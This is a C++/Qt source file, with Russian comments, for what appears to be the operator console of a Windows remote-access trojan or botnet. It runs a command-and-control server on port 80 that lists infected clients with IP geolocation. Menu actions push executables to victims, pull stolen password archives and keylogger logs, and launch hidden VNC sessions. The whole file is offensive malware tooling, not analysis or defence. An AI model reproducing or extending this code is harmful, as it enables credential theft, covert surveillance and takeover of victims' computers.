#include "mainwindow.h"
#include "ui_mainwindow.h"
#include "winsock2.h"
#include "windows.h"
#include "libIP2Location/IP2Location.h"
#include <stdio.h>

//инициализации объектов
NetConnect *netConn = new NetConnect();
NetStatus *netStat = new NetStatus();
ReqStatus *reqStat = new ReqStatus();
IP2Location *IP2LocationObj;

static const char *_mk_NA(const char *p) { return p ? p : "N/A"; }
NetStatus::NetStatus(QObject *parent) : QObject(parent){}
NetConnect::NetConnect(QObject *parent) : QObject(parent){}
ReqStatus::ReqStatus(QObject *parent) : QObject(parent){}

SOCKET sListen;
SOCKET Conn[2000000];
BOOL PINGISCORRECT = TRUE;
SOCKADDR_IN addr;
int sizeofaddr;
int ClientsCounter = 0;

BOOL SendInt(SOCKET Con, int i)
{
    send(Con, (char*)&i, sizeof(int), NULL);
}

int RecvInt(SOCKET Con)
{
    int r = 0;
    recv(Con, (char*)&r, sizeof(int), NULL);
    return r;
}

BOOL NetStatus::recvStat(SOCKET Con)
{
    SendInt(Con, 1);
    if (RecvInt(Con) == 1)
    {
        return TRUE;
    }
    else
    {
        return FALSE;
    }
}

void NetStatus::scanStat()
{
    while(TRUE)
    {
        Sleep(1000);
        if (PINGISCORRECT == TRUE)
        {
            for (int i = 0; i < ClientsCounter; i++)
            {
                if (PINGISCORRECT == FALSE)
                    continue;

                if (recvStat(Conn[i]) != TRUE)
                {
                    emit signalDelClient(i);
                    closesocket(Conn[i]);
                }

            }
        }
    }
}

void NetConnect::recvConn()
{
    for (int i = 0;;i++)
    {
        SOCKET newConn;
        newConn = accept(sListen, (SOCKADDR*)&addr, &sizeofaddr);
        {
            PINGISCORRECT = FALSE;
            int sizeofjson = 0;
            recv(newConn, (char*)&sizeofjson, sizeof(int), NULL);
            char *guid = (char*)malloc(sizeof(char*) * sizeofjson);
            recv(newConn, guid, sizeof(char*) * sizeofjson, NULL);
            Conn[i] = newConn;
            ClientsCounter++;
            char* ipddress = inet_ntoa(addr.sin_addr);
            emit signalNewClient(i, ipddress, guid);
        }
    }
}

void ReqStatus::scanReq()
{
    for (int i= 0; ; i++)
    {
        Sleep(1000);
    }
}

void MainWindow::NewConn(int count, char* ip, char* info)
{
    IP2LocationRecord *rec = IP2Location_get_all(IP2LocationObj, ip);
    char * country = strdup(_mk_NA(rec->country_short));
    ui->tableWidget->insertRow(ui->tableWidget->rowCount());
    ui->tableWidget->setItem(ui->tableWidget->rowCount()-1, 0, new QTableWidgetItem(QString::number(count)));
    ui->tableWidget->setItem(ui->tableWidget->rowCount()-1, 1, new QTableWidgetItem(QString::fromUtf8(ip)));
    ui->tableWidget->setItem(ui->tableWidget->rowCount()-1, 2, new QTableWidgetItem(QString::fromUtf8(country)));
    ui->tableWidget->setItem(ui->tableWidget->rowCount()-1, 3, new QTableWidgetItem(QString::fromUtf8(info)));
    IP2Location_free_record(rec);
    PINGISCORRECT = TRUE;
}

void MainWindow::DelConn(int count)
{
    ui->tableWidget->removeRow(count);
}

MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    IP2LocationObj = IP2Location_open("ipaddr.bin");

    ui->setupUi(this);

    //табличная настройка
    ui->tableWidget->setContextMenuPolicy(Qt::CustomContextMenu);
    ui->tableWidget->setSelectionMode(QAbstractItemView::SingleSelection);
    ui->tableWidget->setSelectionBehavior(QAbstractItemView::SelectRows);
    ui->tableWidget->setColumnHidden(0, true);
    ui->tableWidget->horizontalHeader()->setSectionResizeMode(1, QHeaderView::Stretch);
    ui->tableWidget->horizontalHeader()->setSectionResizeMode(2, QHeaderView::Stretch);
    ui->tableWidget->horizontalHeader()->setSectionResizeMode(3, QHeaderView::Stretch);
    ui->tableWidget->horizontalHeader()->setSectionResizeMode(4, QHeaderView::Stretch);

    connect(ui->tableWidget, SIGNAL(customContextMenuRequested(QPoint)), this, SLOT(slotCustomMenuRequested(QPoint)));

    //инициализация винсок
    WSAData wsaData;
    WORD DLLVersion = MAKEWORD(2, 1);
    WSAStartup(DLLVersion, &wsaData);
    sizeofaddr = sizeof(addr);
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = htons(80);
    addr.sin_family = AF_INET;
    sListen = socket(AF_INET, SOCK_STREAM, NULL);
    bind(sListen, (SOCKADDR*)&addr, sizeofaddr);
    listen(sListen, SOMAXCONN);

    //инициализация потоков
    QThread *ServerThread = new QThread(this);
    QThread *NetStatThread = new QThread(this);
    QThread *RequestsStatThread = new QThread(this);

    //связываем объекты событиями между собой
    connect(this, SIGNAL(destroyed()), ServerThread, SLOT(quit()));
    connect(this, SIGNAL(destroyed()), NetStatThread, SLOT(quit()));
    connect(this, SIGNAL(destroyed()), RequestsStatThread, SLOT(quit()));

    connect(this, &MainWindow::startServer, netConn, &NetConnect::recvConn);
    connect(this, &MainWindow::startStat, netStat, &NetStatus::scanStat);
    connect(this, &MainWindow::startReq, reqStat, &ReqStatus::scanReq);

    connect(this, &MainWindow::startSendFile, reqStat, &ReqStatus::ThreadSendFile);
    connect(netConn, &NetConnect::signalNewClient, this, &MainWindow::NewConn);
    connect(netStat, &NetStatus::signalDelClient, this, &MainWindow::DelConn);

    //перенести объекты в отдельные потоки
    netConn->moveToThread(ServerThread);
    ServerThread->start();
    netStat->moveToThread(NetStatThread);
    NetStatThread->start();
    reqStat->moveToThread(RequestsStatThread);
    RequestsStatThread->start();

    //вызов потоков
    emit startServer();
    emit startStat();
    //emit startReq();
}

MainWindow::~MainWindow()
{
    delete ui;
}

void ReqStatus::ThreadSendFile(SOCKET CON, int row, char *fileName)
{

}

void ThreadSendFile(SOCKET CON, int row, char *fileName)
{

}

void MainWindow::slotSendFile()
{
    int row = 0;
    foreach (QModelIndex index, ui->tableWidget->selectionModel()->selectedIndexes())
    {
        row = index.row();
    }

    int id = ui->tableWidget->item(row, 0)->text().toInt();
    QFileDialog dialog;

    char *fileName = strdup(dialog.getOpenFileName(this, tr("Файл для залива"), "C:\\", tr("Execute File (*.exe)")).toStdString().c_str());

    HANDLE hFile = CreateFileA(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

    if (INVALID_HANDLE_VALUE != hFile)
    {
        DWORD ALLdwSize = GetFileSize(hFile, nullptr);
        char* lpBuffer = (char*)malloc(ALLdwSize);
        DWORD dwBytesRead = 0;
        ReadFile(hFile, lpBuffer, ALLdwSize, &dwBytesRead, nullptr);
        if (ALLdwSize == dwBytesRead)
        {

            PINGISCORRECT = FALSE;

            int sendingfile = 2;
            DWORD RES = 0;

            send(Conn[id], (char*)&sendingfile, sizeof(int), NULL);
            send(Conn[id], (char*)&dwBytesRead, sizeof(DWORD), NULL);

            int len = dwBytesRead;

            while (len > 0)
            {
                int chunk;
                int sended;
                chunk = 1024;

                if (chunk > len)
                {
                    chunk = len;
                }

                send(Conn[id], (char*)&chunk, sizeof(int), NULL);

            doublesended:
                sended = send(Conn[id], &lpBuffer[dwBytesRead - len], chunk, 0);
                int recved = 0;
                recv(Conn[id], (char*)&recved, sizeof(int), NULL);

                if (recved == 1)
                {
                    goto doublesended;
                }

                len -= sended;

                if (sended == -1)
                {
                    send(Conn[id], (char*)&len, sizeof(int), NULL);
                    break;
                }

                if (len == 0)
                {
                    send(Conn[id], (char*)&len, sizeof(int), NULL);
                    break;
                }
            }

            recv(Conn[id], (char*)&RES, sizeof(DWORD), NULL);

            if (RES == 1)
            {
                ui->tableWidget->setItem(row, 4, new QTableWidgetItem(QString::fromUtf8("Файл доставлен")));
            } else {
                ui->tableWidget->setItem(row, 4, new QTableWidgetItem(QString::fromUtf8("Файл не доставлен")));
            }

            PINGISCORRECT = TRUE;
        }
    }

    CloseHandle(hFile);

}

void MainWindow::slotStealerFile()
{

    int row = 0;
    foreach (QModelIndex index, ui->tableWidget->selectionModel()->selectedIndexes())
    {
        row = index.row();
    }

    int id = ui->tableWidget->item(row, 0)->text().toInt();

    QString folder = ui->tableWidget->item(row, 3)->text();

    if (QDir(folder).exists() == false)
    {
        QDir().mkdir(folder);
    }

    char* passfile = (char*)malloc(512);
    wsprintfA(passfile, "%s\\passwords.zip", folder.toStdString().c_str());

    PINGISCORRECT = FALSE;

    DWORD FILELEN = 0;
    HANDLE hFile = CreateFileA(passfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    int steal = 3;
    send(Conn[id], (char*)&steal, sizeof(int), NULL);

    recv(Conn[id], (char*)&FILELEN, sizeof(DWORD), NULL);

    {
        int len = FILELEN;

        while (TRUE)
        {

            int chunk;
            int recved;

            recved = recv(Conn[id], (char*)&chunk, sizeof(int), NULL);

            if (recved == -1)
            {

                break;

            }

            if (chunk == 0)
            {

                break;

            }

            char* buff = (char*)malloc(chunk);
            DWORD dwBytesWrite = 0;

        isdoublesended:

            recved = recv(Conn[id], (char*)buff, chunk, NULL);

            if (recved == -1)
            {

                int err = 1;
                send(Conn[id], (char*)&err, sizeof(int), NULL);
                goto isdoublesended;

            }
            else
            {

                int good = 0;
                send(Conn[id], (char*)&good, sizeof(int), NULL);

            }

            WriteFile(hFile, buff, chunk, &dwBytesWrite, NULL);

        }

        CloseHandle(hFile);

    }

    DWORD GOODJOB = 1;
    send(Conn[id], (char*)&GOODJOB, sizeof(DWORD), NULL);

    PINGISCORRECT = TRUE;

}

void MainWindow::slotGetKeys()
{

    int row = 0;
    foreach (QModelIndex index, ui->tableWidget->selectionModel()->selectedIndexes())
    {
        row = index.row();
    }

    int id = ui->tableWidget->item(row, 0)->text().toInt();

    QString folder = ui->tableWidget->item(row, 3)->text();

    if (QDir(folder).exists() == false)
    {
        QDir().mkdir(folder);
    }

    char* passfile = (char*)malloc(512);
    wsprintfA(passfile, "%s\\keylog.zip", folder.toStdString().c_str());

    PINGISCORRECT = FALSE;

    DWORD FILELEN = 0;
    HANDLE hFile = CreateFileA(passfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    int steal = 4;
    send(Conn[id], (char*)&steal, sizeof(int), NULL);

    recv(Conn[id], (char*)&FILELEN, sizeof(DWORD), NULL);

    {
        int len = FILELEN;

        while (TRUE)
        {

            int chunk;
            int recved;

            recved = recv(Conn[id], (char*)&chunk, sizeof(int), NULL);

            if (recved == -1)
            {

                break;

            }

            if (chunk == 0)
            {

                break;

            }

            char* buff = (char*)malloc(chunk);
            DWORD dwBytesWrite = 0;

        isdoublesended:

            recved = recv(Conn[id], (char*)buff, chunk, NULL);

            if (recved == -1)
            {

                int err = 1;
                send(Conn[id], (char*)&err, sizeof(int), NULL);
                goto isdoublesended;

            }
            else
            {

                int good = 0;
                send(Conn[id], (char*)&good, sizeof(int), NULL);

            }

            WriteFile(hFile, buff, chunk, &dwBytesWrite, NULL);

        }

        CloseHandle(hFile);

    }

    DWORD GOODJOB = 1;
    send(Conn[id], (char*)&GOODJOB, sizeof(DWORD), NULL);

    PINGISCORRECT = TRUE;

}

void MainWindow::slotRunHvncFile()
{

    int row = 0;
    foreach (QModelIndex index, ui->tableWidget->selectionModel()->selectedIndexes())
    {
        row = index.row();
    }

    int id = ui->tableWidget->item(row, 0)->text().toInt();

    char *fileName = "C:\\cli.exe";

    STARTUPINFOA startupInfo = { 0 };
    startupInfo.cb = sizeof(startupInfo);
    PROCESS_INFORMATION processInfo = { 0 };
    CreateProcessA(NULL, (LPSTR)"C:\\serv.exe", NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);

    HANDLE hFile = CreateFileA(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

    if (INVALID_HANDLE_VALUE != hFile)
    {
        DWORD ALLdwSize = GetFileSize(hFile, nullptr);
        char* lpBuffer = (char*)malloc(ALLdwSize);
        DWORD dwBytesRead = 0;
        ReadFile(hFile, lpBuffer, ALLdwSize, &dwBytesRead, nullptr);
        if (ALLdwSize == dwBytesRead)
        {

            PINGISCORRECT = FALSE;

            int sendingfile = 2;
            DWORD RES = 0;

            send(Conn[id], (char*)&sendingfile, sizeof(int), NULL);
            send(Conn[id], (char*)&dwBytesRead, sizeof(DWORD), NULL);

            int len = dwBytesRead;

            while (len > 0)
            {
                int chunk;
                int sended;
                chunk = 1024;

                if (chunk > len)
                {
                    chunk = len;
                }

                send(Conn[id], (char*)&chunk, sizeof(int), NULL);

            doublesended:
                sended = send(Conn[id], &lpBuffer[dwBytesRead - len], chunk, 0);
                int recved = 0;
                recv(Conn[id], (char*)&recved, sizeof(int), NULL);

                if (recved == 1)
                {
                    goto doublesended;
                }

                len -= sended;

                if (sended == -1)
                {
                    send(Conn[id], (char*)&len, sizeof(int), NULL);
                    break;
                }

                if (len == 0)
                {
                    send(Conn[id], (char*)&len, sizeof(int), NULL);
                    break;
                }
            }

            recv(Conn[id], (char*)&RES, sizeof(DWORD), NULL);

            if (RES == 1)
            {
                ui->tableWidget->setItem(row, 4, new QTableWidgetItem(QString::fromUtf8("ХВНЦ запущен")));
            } else {
                ui->tableWidget->setItem(row, 4, new QTableWidgetItem(QString::fromUtf8("Произошёл пёздец, кто-то виноват (не я)")));
            }

            PINGISCORRECT = TRUE;
        }
    }

    CloseHandle(hFile);

}


void MainWindow::slotCustomMenuRequested(QPoint pos)
{
    QMenu * menu = new QMenu(this);

    QAction * send_file = new QAction(trUtf8("Send File"), this);
    connect(send_file, SIGNAL(triggered()), this, SLOT(slotSendFile()));
    menu->addAction(send_file);
    menu->popup(ui->tableWidget->viewport()->mapToGlobal(pos));

    QAction * run_stealer = new QAction(trUtf8("Steal Pass"), this);
    connect(run_stealer, SIGNAL(triggered()), this, SLOT(slotStealerFile()));
    menu->addAction(run_stealer);
    menu->popup(ui->tableWidget->viewport()->mapToGlobal(pos));

    QAction * get_keys = new QAction(trUtf8("Get Keylog"), this);
    connect(get_keys, SIGNAL(triggered()), this, SLOT(slotGetKeys()));
    menu->addAction(get_keys);
    menu->popup(ui->tableWidget->viewport()->mapToGlobal(pos));

    QAction * run_hvnc = new QAction(trUtf8("HVNC run"), this);
    connect(run_hvnc, SIGNAL(triggered()), this, SLOT(slotRunHvncFile()));
    menu->addAction(run_hvnc);
    menu->popup(ui->tableWidget->viewport()->mapToGlobal(pos));
}
